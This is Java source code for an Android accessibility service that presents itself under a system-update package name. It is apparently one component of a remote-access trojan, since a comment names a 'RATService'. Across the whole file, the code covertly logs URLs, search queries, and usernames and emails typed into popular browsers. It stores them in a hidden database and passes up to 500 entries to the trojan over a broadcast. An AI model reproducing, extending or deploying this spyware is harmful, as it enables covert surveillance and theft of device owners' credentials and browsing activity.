package com.android.system.update;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class BrowserAccessibilityService extends AccessibilityService {
    private static final String TAG = "BrowserAccessibility";
    private static final String PREFS_NAME = "browser_accessibility";
    private static final String KEY_ENABLED = "accessibility_enabled";
    private static final String KEY_CAPTURED_URLS = "captured_urls";
    
    // Action constants for broadcast communication
    private static final String ACTION_REQUEST_CAPTURED_DATA = "com.android.system.update.REQUEST_CAPTURED_DATA";
    private static final String ACTION_CAPTURED_DATA_RESPONSE = "com.android.system.update.CAPTURED_BROWSER_DATA";
    
    private static BrowserAccessibilityService instance;
    private Set<String> capturedUrls = new HashSet<>();
    private BrowserDatabaseHelper dbHelper;
    private BroadcastReceiver requestReceiver;
    
    public static BrowserAccessibilityService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        dbHelper = new BrowserDatabaseHelper(this);
        loadCapturedUrls();
        
        // Register receiver for data requests from RATService
        requestReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (ACTION_REQUEST_CAPTURED_DATA.equals(intent.getAction())) {
                    Log.d(TAG, "Received request for captured data");
                    String data = getCapturedDataInternal();
                    sendCapturedDataViaBroadcast(data);
                }
            }
        };
        
        IntentFilter filter = new IntentFilter(ACTION_REQUEST_CAPTURED_DATA);
        registerReceiver(requestReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        
        Log.d(TAG, "Browser Accessibility Service created");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isEnabled()) return;
        
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                captureBrowserData(event);
                break;
        }
    }
    
    private void captureBrowserData(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;
        
        // Check if this is from a browser
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!isBrowserPackage(packageName)) return;
        
        Log.d(TAG, "Capturing data from: " + packageName);
        
        // Capture URL from address bar
        String url = findUrlInNode(source);
        if (url != null && !url.isEmpty() && !capturedUrls.contains(url)) {
            saveCapturedUrl(packageName, url, event.getEventTime());
            capturedUrls.add(url);
            saveCapturedUrls();
        }
        
        // Capture search queries
        String searchQuery = findSearchQuery(source);
        if (searchQuery != null && !searchQuery.isEmpty()) {
            saveSearchQuery(packageName, searchQuery, event.getEventTime());
        }
        
        // Capture form data (potential passwords/usernames)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            captureFormData(event, packageName);
        }
        
        source.recycle();
    }
    
    private String findUrlInNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        
        // Check if this node contains a URL
        CharSequence text = node.getText();
        if (text != null && text.toString().startsWith("http")) {
            return text.toString();
        }
        
        // Check content description
        CharSequence contentDesc = node.getContentDescription();
        if (contentDesc != null && contentDesc.toString().startsWith("http")) {
            return contentDesc.toString();
        }
        
        // Check if this is an address bar (common resource IDs)
        CharSequence viewId = node.getViewIdResourceName();
        if (viewId != null) {
            String id = viewId.toString().toLowerCase();
            if (id.contains("url") || id.contains("address") || id.contains("omnibox") || id.contains("search_box")) {
                CharSequence urlText = node.getText();
                if (urlText != null && urlText.toString().startsWith("http")) {
                    return urlText.toString();
                }
            }
        }
        
        // Search children
        for (int i = 0; i < node.getChildCount(); i++) {
            String result = findUrlInNode(node.getChild(i));
            if (result != null) return result;
        }
        
        return null;
    }
    
    private String findSearchQuery(AccessibilityNodeInfo node) {
        if (node == null) return null;
        
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            CharSequence viewId = node.getViewIdResourceName();
            if (viewId != null) {
                String id = viewId.toString().toLowerCase();
                if (id.contains("search") || id.contains("query") || id.contains("find")) {
                    return text.toString();
                }
            }
        }
        
        // Search children
        for (int i = 0; i < node.getChildCount(); i++) {
            String result = findSearchQuery(node.getChild(i));
            if (result != null) return result;
        }
        
        return null;
    }
    
    private void captureFormData(AccessibilityEvent event, String packageName) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;
        
        CharSequence viewId = source.getViewIdResourceName();
        if (viewId != null) {
            String id = viewId.toString().toLowerCase();
            CharSequence text = source.getText();
            
            if (text != null && text.length() > 0) {
                if (id.contains("password") || id.contains("pass")) {
                    // Potential password field
                    saveFormData(packageName, "password_field", "********", event.getEventTime());
                } else if (id.contains("email") || id.contains("username") || id.contains("user")) {
                    // Potential username/email field
                    saveFormData(packageName, "username", text.toString(), event.getEventTime());
                }
            }
        }
        
        source.recycle();
    }
    
    private boolean isBrowserPackage(String packageName) {
        return packageName.contains("chrome") ||
               packageName.contains("firefox") ||
               packageName.contains("UCMobile") ||
               packageName.contains("opera") ||
               packageName.contains("sbrowser") ||
               packageName.contains("microsoft") ||
               packageName.contains("brave") ||
               packageName.contains("kiwi") ||
               packageName.contains("edge");
    }
    
    private void saveCapturedUrl(String packageName, String url, long timestamp) {
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put("package_name", packageName);
        values.put("url", url);
        values.put("title", extractTitleFromUrl(url));
        values.put("timestamp", timestamp);
        values.put("type", "history");
        
        long id = db.insert("browser_data", null, values);
        db.close();
        
        Log.d(TAG, "Saved URL: " + url + " (id: " + id + ")");
    }
    
    private void saveSearchQuery(String packageName, String query, long timestamp) {
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put("package_name", packageName);
        values.put("query", query);
        values.put("timestamp", timestamp);
        values.put("type", "search");
        
        long id = db.insert("browser_data", null, values);
        db.close();
        
        Log.d(TAG, "Saved search: " + query + " (id: " + id + ")");
    }
    
    private void saveFormData(String packageName, String field, String value, long timestamp) {
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put("package_name", packageName);
        values.put("field", field);
        values.put("value", value);
        values.put("timestamp", timestamp);
        values.put("type", "form_data");
        
        long id = db.insert("browser_data", null, values);
        db.close();
        
        Log.d(TAG, "Saved form data - " + field + ": " + value + " (id: " + id + ")");
    }
    
    private String extractTitleFromUrl(String url) {
        try {
            if (url.contains("google.com/search")) {
                return "Google Search";
            } else if (url.contains("youtube.com")) {
                return "YouTube";
            } else if (url.contains("github.com")) {
                return "GitHub";
            } else if (url.contains("facebook.com")) {
                return "Facebook";
            } else if (url.contains("twitter.com") || url.contains("x.com")) {
                return "Twitter/X";
            } else if (url.contains("instagram.com")) {
                return "Instagram";
            } else if (url.contains("amazon.com")) {
                return "Amazon";
            } else if (url.contains("wikipedia.org")) {
                return "Wikipedia";
            } else {
                return "Web Page";
            }
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private void loadCapturedUrls() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String urls = prefs.getString(KEY_CAPTURED_URLS, "");
        if (!urls.isEmpty()) {
            String[] urlArray = urls.split(",");
            for (String url : urlArray) {
                capturedUrls.add(url);
            }
        }
        Log.d(TAG, "Loaded " + capturedUrls.size() + " previously captured URLs");
    }
    
    private void saveCapturedUrls() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        StringBuilder sb = new StringBuilder();
        for (String url : capturedUrls) {
            if (sb.length() > 0) sb.append(",");
            sb.append(url);
        }
        prefs.edit().putString(KEY_CAPTURED_URLS, sb.toString()).apply();
    }
    
    private boolean isEnabled() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getBoolean(KEY_ENABLED, false);
    }
    
    public static void setEnabled(Context context, boolean enabled) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putBoolean(KEY_ENABLED, enabled).apply();
        Log.d(TAG, "Accessibility service enabled state set to: " + enabled);
    }
    
    private void sendCapturedDataViaBroadcast(String data) {
        Intent intent = new Intent(ACTION_CAPTURED_DATA_RESPONSE);
        intent.putExtra("data", data);
        sendBroadcast(intent);
        Log.d(TAG, "Sent captured data via broadcast");
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (requestReceiver != null) {
            unregisterReceiver(requestReceiver);
            requestReceiver = null;
        }
        instance = null;
        if (dbHelper != null) {
            dbHelper.close();
        }
        Log.d(TAG, "Accessibility service destroyed");
    }
    
    // Internal method to get captured data
    private String getCapturedDataInternal() {
        try {
            JSONArray dataArray = new JSONArray();
            SQLiteDatabase db = dbHelper.getReadableDatabase();
            
            Cursor cursor = db.query("browser_data", null, null, null, null, null, "timestamp DESC LIMIT 500");
            
            int idIndex = cursor.getColumnIndex("id");
            int packageNameIndex = cursor.getColumnIndex("package_name");
            int urlIndex = cursor.getColumnIndex("url");
            int titleIndex = cursor.getColumnIndex("title");
            int queryIndex = cursor.getColumnIndex("query");
            int fieldIndex = cursor.getColumnIndex("field");
            int valueIndex = cursor.getColumnIndex("value");
            int typeIndex = cursor.getColumnIndex("type");
            int timestampIndex = cursor.getColumnIndex("timestamp");
            
            if (cursor.moveToFirst()) {
                do {
                    JSONObject item = new JSONObject();
                    
                    if (idIndex >= 0) item.put("id", cursor.getInt(idIndex));
                    if (packageNameIndex >= 0) item.put("packageName", cursor.getString(packageNameIndex));
                    if (urlIndex >= 0) item.put("url", cursor.getString(urlIndex));
                    if (titleIndex >= 0) item.put("title", cursor.getString(titleIndex));
                    if (queryIndex >= 0) item.put("query", cursor.getString(queryIndex));
                    if (fieldIndex >= 0) item.put("field", cursor.getString(fieldIndex));
                    if (valueIndex >= 0) item.put("value", cursor.getString(valueIndex));
                    if (typeIndex >= 0) item.put("type", cursor.getString(typeIndex));
                    if (timestampIndex >= 0) {
                        long timestamp = cursor.getLong(timestampIndex);
                        item.put("timestamp", timestamp);
                        
                        // Format timestamp
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                        item.put("timestampFormatted", sdf.format(new Date(timestamp)));
                    }
                    
                    dataArray.put(item);
                } while (cursor.moveToNext());
            }
            
            cursor.close();
            db.close();
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("data", dataArray);
            result.put("count", dataArray.length());
            
            Log.d(TAG, "Retrieved " + dataArray.length() + " captured entries");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting captured data", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    // Public method to get captured data (can be called directly if needed)
    public String getCapturedData() {
        return getCapturedDataInternal();
    }
    
    // Database Helper
    private static class BrowserDatabaseHelper extends SQLiteOpenHelper {
        private static final String DATABASE_NAME = "browser_capture.db";
        private static final int DATABASE_VERSION = 1;
        
        public BrowserDatabaseHelper(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }
        
        @Override
        public void onCreate(SQLiteDatabase db) {
            String createTable = "CREATE TABLE browser_data (" +
                "id INTEGER PRIMARY KEY AUTOINCREMENT," +
                "package_name TEXT," +
                "url TEXT," +
                "title TEXT," +
                "query TEXT," +
                "field TEXT," +
                "value TEXT," +
                "type TEXT," +
                "timestamp LONG" +
                ")";
            db.execSQL(createTable);
            Log.d(TAG, "Database created");
        }
        
        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS browser_data");
            onCreate(db);
        }
    }
}
